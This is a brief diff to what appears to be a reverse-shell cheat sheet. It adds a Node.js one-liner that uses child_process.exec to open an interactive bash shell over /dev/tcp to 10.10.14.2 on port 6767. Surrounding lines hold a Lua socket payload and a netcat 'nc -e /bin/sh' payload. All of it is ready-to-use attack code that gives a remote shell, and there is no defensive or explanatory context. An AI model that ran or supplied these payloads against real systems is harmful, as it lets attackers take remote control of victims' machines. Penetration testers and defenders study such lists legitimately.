@@ -156,6 +156,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 or
 
 require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")
 
 or
 
